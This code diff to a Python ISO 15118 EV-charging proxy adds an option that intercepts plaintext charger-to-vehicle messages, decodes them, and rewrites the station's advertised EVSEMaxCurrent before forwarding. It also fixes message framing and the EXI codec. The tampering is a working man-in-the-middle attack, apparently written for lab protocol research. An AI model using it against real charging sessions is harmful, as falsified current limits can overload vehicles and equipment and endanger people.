@@ -18,6 +18,9 @@ parser = argparse.ArgumentParser(description="ISO15118 Pass-through Proxy")
 parser.add_argument("--capture", action="store_true", help="Save packets to proxy_capture.log")
 parser.add_argument("--show-hex", action="store_true", help="Print packet hex previews")
 parser.add_argument("--debug", action="store_true", help="Enable EXI decoding for non-TLS")
+parser.add_argument("--tamper", action="store_true",
+                     help="Tamper with EVSEMaxCurrent in ChargeParameterDiscoveryRes "
+                          "(non-TLS sessions only). Same effect as TAMPER=1.")
 args = parser.parse_args()
 
 CAPTURE_FILE = "proxy_capture.log"
@@ -25,18 +28,28 @@ SHOW_PACKET_HEX = args.show_hex
 ENABLE_CAPTURE = args.capture
 DEBUG_EXI = args.debug
 
+# Only active for plaintext (non-TLS) sessions: the proxy relays TLS as an
+# opaque encrypted byte stream (see handle_client) without terminating it
+# itself, so it has no way to see or modify TLS-protected content without a
+# full TLS-interception MITM (present our own cert to EVCC, our own client
+# connection to SECC) -- a much larger feature this does not implement.
+TAMPER_ENABLED = args.tamper or os.environ.get("TAMPER") == "1"
+TAMPER_NEW_CURRENT_A = int(os.environ.get("TAMPER_CURRENT_A", "63"))
+
 # --------------------------------------------------------------------
 # Project setup
 # --------------------------------------------------------------------
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
-from iso15118.shared.iexi_codec import IEXICodec
-from iso15118.shared.settings import JAR_FILE_PATH
+from iso15118.shared.exificient_exi_codec import ExificientEXICodec as _RealExificientEXICodec
 
 LISTEN_HOST = '::'
 UDP_PORT = 15118
 SDP_MULTICAST_GROUP = 'ff02::1'
 SDP_SERVER_PORT = 15118
 proxy_port = 55000
+
+APP_PROTOCOL_NS = "urn:iso:15118:2:2010:AppProtocol"
+MSG_DEF_NS = "urn:iso:15118:2:2013:MsgDef"
 
 executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
 
@@ -62,29 +75,47 @@ inet6_link_pattern = re.compile(r'inet6 ([\da-fA-F:]+)/\d+ scope link')
 # --------------------------------------------------------------------
 # EXI Codec Wrapper
 # --------------------------------------------------------------------
-class ExificientEXICodec(IEXICodec):
-    _gateway = None
-    _exi_codec = None
+# The original hand-rolled version of this class here only implemented
+# decode() (not encode()/get_version()), which IEXICodec's ABC requires --
+# so `ExificientEXICodec()` raised `TypeError: Can't instantiate abstract
+# class ... with abstract methods encode, get_version` the moment --debug
+# was used, silently killing every session it was tried on. Fixed by
+# reusing the real, complete codec the SECC/EVCC processes themselves use
+# (iso15118.shared.exificient_exi_codec.ExificientEXICodec) instead of a
+# partial reimplementation -- this also guarantees encode()'s output stays
+# schema-compatible with whatever this iso15118 version actually expects,
+# which a hand-rolled encoder would risk getting subtly wrong.
+class ProxyCodec:
+    _shared = None
+
     def __init__(self):
-        if ExificientEXICodec._gateway is None:
-            from py4j.java_gateway import JavaGateway
-            ExificientEXICodec._gateway = JavaGateway.launch_gateway(
-                classpath=JAR_FILE_PATH,
-                die_on_exit=True,
-                javaopts=["--add-opens", "java.base/java.lang=ALL-UNNAMED"],
-            )
-            ExificientEXICodec._exi_codec = (
-                ExificientEXICodec._gateway.jvm.com.siemens.ct.exi.main.cmd.EXICodec()
-            )
-        self.gateway = ExificientEXICodec._gateway
-        self.exi_codec = ExificientEXICodec._exi_codec
+        if ProxyCodec._shared is None:
+            ProxyCodec._shared = _RealExificientEXICodec()
+        self._codec = ProxyCodec._shared
 
     async def decode(self, stream: bytes, namespace: str) -> str:
         loop = asyncio.get_running_loop()
-        decoded = await loop.run_in_executor(None, self.exi_codec.decode, stream, namespace)
-        if decoded is None:
-            raise Exception(self.exi_codec.get_last_decoding_error())
-        return decoded
+        return await loop.run_in_executor(None, self._codec.decode, stream, namespace)
+
+    async def encode(self, message: str, namespace: str) -> bytes:
+        loop = asyncio.get_running_loop()
+        return await loop.run_in_executor(None, self._codec.encode, message, namespace)
+
+
+async def decode_with_fallback(codec, payload: bytes):
+    """
+    Try decoding a V2GTP payload against each known namespace in turn.
+    Only the very first message on a session (SupportedAppProtocolReq/Res)
+    uses APP_PROTOCOL_NS; everything after that uses MSG_DEF_NS. Returns
+    (decoded_dict, namespace) or (None, None) if nothing matched.
+    """
+    for ns in (APP_PROTOCOL_NS, MSG_DEF_NS):
+        try:
+            decoded = await codec.decode(payload, ns)
+            return json.loads(decoded), ns
+        except Exception:
+            continue
+    return None, None
 
 # --------------------------------------------------------------------
 # Helpers
@@ -169,6 +200,39 @@ def create_new_response_message(original_message, new_ip, new_port):
     new_ip_bytes = ipaddress.IPv6Address(new_ip).packed
     new_port_bytes = new_port.to_bytes(2, 'big')
     return original_message[:8] + new_ip_bytes + new_port_bytes + original_message[26:]
+
+async def read_v2gtp_message(reader):
+    """
+    Read exactly one V2GTP message: an 8-byte header (1B version, 1B
+    inverse version, 2B payload type, 4B payload length) followed by
+    exactly that many payload bytes. Used for every plaintext message, not
+    just the first -- both to make sure SECC/EVCC always receive one
+    complete message per write (see the framing-bug note in handle_client)
+    and because tampering needs reliable message boundaries to decode.
+    Raises asyncio.IncompleteReadError on a clean EOF.
+    """
+    header = await reader.readexactly(8)
+    payload_length = int.from_bytes(header[4:8], "big")
+    payload = await reader.readexactly(payload_length)
+    return header, payload
+
+def tamper_charge_parameter_discovery_res(decoded):
+    """
+    If `decoded` is a ChargeParameterDiscoveryRes, bump AC_EVSEChargeParameter
+    .EVSEMaxCurrent.Value to TAMPER_NEW_CURRENT_A in place and return the
+    original value. Returns None (no change made) if this isn't that
+    message, or if the expected AC field path isn't present (e.g. a DC
+    session, which uses DC_EVSEChargeParameter instead -- left alone rather
+    than guessing at a DC-specific field to tamper).
+    """
+    try:
+        charge_param_res = decoded["V2G_Message"]["Body"]["ChargeParameterDiscoveryRes"]
+        max_current = charge_param_res["AC_EVSEChargeParameter"]["EVSEMaxCurrent"]
+    except (KeyError, TypeError):
+        return None
+    original_value = max_current["Value"]
+    max_current["Value"] = TAMPER_NEW_CURRENT_A
+    return original_value
 
 # --------------------------------------------------------------------
 # UDP SDP Proxy (Python 3.8 safe)
@@ -269,37 +333,74 @@ async def handle_client(client_reader, client_writer):
             server_writer.write(header + payload)
             await server_writer.drain()
 
-        codec = ExificientEXICodec() if (DEBUG_EXI and not is_tls) else None
+        # A codec is only needed for plaintext sessions, and only if
+        # something's actually going to use it -- default pass-through stays
+        # zero-overhead (no JVM decode round-trip per message).
+        codec = ProxyCodec() if (not is_tls and (DEBUG_EXI or TAMPER_ENABLED)) else None
+        if TAMPER_ENABLED and is_tls:
+            print("\n[TAMPER] TAMPER is enabled but this session negotiated TLS -- "
+                  "the proxy relays TLS as an opaque encrypted stream without "
+                  "terminating it, so tampering is not possible here. Forwarding "
+                  "unmodified. Use notls mode to see tampering take effect.\n")
 
-        async def pipe(reader, writer, direction):
+        def log_and_capture(direction, data):
+            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+            print(f"[{ts}] {direction} {len(data)} bytes")
+            if SHOW_PACKET_HEX:
+                hex_preview = data.hex()
+                if len(hex_preview) > 128:
+                    hex_preview = hex_preview[:128] + "..."
+                print(f"    {hex_preview}")
+            if ENABLE_CAPTURE:
+                with open(CAPTURE_FILE, "a") as f:
+                    f.write(f"{ts} {direction} len={len(data)} data={data.hex()}\n")
+
+        async def pipe_tls(reader, writer, direction):
+            # Opaque byte relay -- the proxy never sees plaintext here.
             while True:
                 data = await reader.read(4096)
                 if not data:
                     break
                 writer.write(data)
                 await writer.drain()
+                log_and_capture(direction, data)
 
-                ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
-                info = f"[{ts}] {direction} {len(data)} bytes"
-                print(info)
+        async def pipe_plaintext(reader, writer, direction):
+            # V2GTP-framed relay: one complete message per read/write, same
+            # framing fix as the first message above. This also gives
+            # tampering (and --debug decoding) reliable message boundaries
+            # to work with, rather than whatever a raw `read(4096)` happens
+            # to return.
+            while True:
+                try:
+                    header, payload = await read_v2gtp_message(reader)
+                except asyncio.IncompleteReadError:
+                    break
 
-                if SHOW_PACKET_HEX:
-                    hex_preview = data.hex()
-                    if len(hex_preview) > 128:
-                        hex_preview = hex_preview[:128] + "..."
-                    print(f"    {hex_preview}")
+                out_header, out_payload = header, payload
 
-                if ENABLE_CAPTURE:
-                    with open(CAPTURE_FILE, "a") as f:
-                        f.write(f"{ts} {direction} len={len(data)} data={data.hex()}\n")
+                if codec:
+                    decoded, ns = await decode_with_fallback(codec, payload)
+                    if decoded is not None:
+                        if (TAMPER_ENABLED and direction == "SECC→EVCC"
+                                and ns == MSG_DEF_NS):
+                            original_value = tamper_charge_parameter_discovery_res(decoded)
+                            if original_value is not None:
+                                new_payload = await codec.encode(json.dumps(decoded), MSG_DEF_NS)
+                                out_header = header[0:4] + len(new_payload).to_bytes(4, "big")
+                                out_payload = new_payload
+                                print(f"\n[TAMPER] EVSEMaxCurrent: {original_value}A -> "
+                                      f"{TAMPER_NEW_CURRENT_A}A (ChargeParameterDiscoveryRes, {direction})\n")
+                        if DEBUG_EXI:
+                            print(f"\n[{direction}] Decoded EXI (ns={ns}):\n"
+                                  f"{json.dumps(decoded, indent=4)}\n")
 
-                if codec and len(data) > 8:
-                    try:
-                        decoded = await codec.decode(data[8:], "urn:iso:15118:2:2010:AppProtocol")
-                        print(f"\n[{direction}] Decoded EXI:\n{json.dumps(json.loads(decoded), indent=4)}\n")
-                    except Exception:
-                        pass
+                out_data = out_header + out_payload
+                writer.write(out_data)
+                await writer.drain()
+                log_and_capture(direction, out_data)
 
+        pipe = pipe_tls if is_tls else pipe_plaintext
         await asyncio.gather(
             pipe(client_reader, server_writer, "EVCC→SECC"),
             pipe(server_reader, client_writer, "SECC→EVCC"),
